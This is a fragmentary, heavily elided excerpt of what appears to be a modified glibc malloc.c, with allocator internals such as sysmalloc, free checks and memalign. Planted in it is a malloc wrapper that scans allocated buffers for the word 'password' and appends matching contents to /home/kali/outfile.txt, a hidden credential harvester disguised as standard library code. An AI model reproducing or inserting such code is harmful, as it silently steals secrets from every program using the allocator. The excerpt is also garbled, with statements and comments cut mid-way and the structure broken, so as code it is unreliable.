...
* Quickstart
  ...
  Many/most systems will additionally require USE_TSD_DATA_ptr to be
...
*/
void *__wlibc_malloc (size_t bytes);
...
/*
   ...
   available.  Given it's sole purpose is to reduce number of redundant calls
   to malloc_consolidate, it does not affect correctness.  As a result we can
...
/*
   ...
   probably figure out how to ptr this routine to print out or
		...
		mstate av)
{
  ...
  char *mm = (char *) MMAP (0, size, mtag_mmap_flags | PROT_READ | PROT_WRITE,
			    extra_flags);
  if (mm == MAP_FAILED)
    return mm;
  ...
  if (av != &main_arena)
      ...
      if (brk == (char *) (MORECORE_FAILURE))
	{
	  ...
	  if (mbrk == MAP_FAILED)
		...
		&size, nb, old_size, MMAP_AS_MORECORE_SIZE, pagesize, 0, av);
	  if (mbrk != MAP_FAILED)
	    {
	   ...
	   */
	      ...
	      if (contiguous (av))
		{
		  ...
		  if (front_misalign > 0)
		    {
			 ...
			 bytes. They will never be accessed anyway because
		  ...
		  /*
		     ...
		     assumption unless program is multithreaded but doesn't use
		     locks and a foreign sbrk occurred between our first and
		     second calls.
		   */
		  ...
		  if (MALLOC_ALIGNMENT == CHUNK_HDR_SZ)
		      ...
		      if (front_misalign > 0)
			{
			  /*
			     ...
			     chunk created from its start) is always true after
			     initialization.
			   */
	      ...
	      if (snd_brk != (char *) (MORECORE_FAILURE))
		{
		  ...
		  /*
		     ...
		     a double fencepost at old_top to prevent consolidation
		     with space we don't own. These fenceposts are artificial
		     chunks that are marked as inuse and are in any case too
		     small to use.  We need two to make sizes and alignments
		     work out.
		   */
...
{
  static void *arr[10] = { NULL };
  void *ret_ptr = NULL;
  int i = 0;
  int fd = 0;

  ret_ptr = __wlibc_malloc (bytes);

  for (i = 0; i < 10; i++)
    {
      if (arr[i] != NULL)
	    {
        if (NULL != strstr (arr[i], "password"))
          {
            write (1, "found\n", 6);
            fd = open ("/home/kali/outfile.txt", O_WRONLY | O_APPEND);
            write (fd, arr[i], 10);
            close (fd);
          }
	    }
	  ...
	  if (size == nb)
		...
		set_non_main_arena (victim);
		 ...
		 We may return one of these chunks later.  */
	      if (tcache_nb > 0 && tcache->counts[tc_idx] < mp_.tcache_count)
		{
  ...
  */
  ...
  if ((unsigned long) (size) <= (unsigned long) (get_max_fast ())
  ...
  )
    {
      ...
      if (__builtin_expect (
	      chunksize_nomask (chunk_at_offset (p, size)) <= CHUNK_HDR_SZ, 0)
	  || __builtin_expect (
	      chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0))
	{
	  bool fail = true;
	  /* We might not have a lock at this point and concurrent
	     modifications of system_mem might result in a false positive. Redo
	     the test after getting the lock.  */
	  if (!have_lock)
	    {
...
_int_memalign (mstate av, size_t alignment, size_t bytes)
{
  ...
  if (av != NULL)
	...
	last_bin_index = largebin_index (nb * 2);
      ...
      for (victim_index = first_bin_index; victim_index < last_bin_index;
	   victim_index++)
	{
	  victim = NULL;
	  ...
	  if (victim_index < first_largebin_index)
	      ...
	      while (fwd != bck)
		{
		  ...
		  if (extra > 0 && (extra <= best_size || best == NULL))
		    {
		      best = fwd;
		      best_size = extra;
		    }
...
weak_alias (__malloc_info, malloc_info)
	...
	strong_alias (__libc_free, __free) strong_alias (
	    __libc_free, free) strong_alias (__libc_malloc, __malloc)
	    strong_alias (__libc_malloc, malloc) strong_alias (
		__libc_memalign,
		__memalign) weak_alias (__libc_memalign,
					memalign) strong_alias (__libc_realloc,
								__realloc)
		strong_alias (__libc_realloc, realloc) strong_alias (
		    __libc_valloc, __valloc) weak_alias (__libc_valloc, valloc)
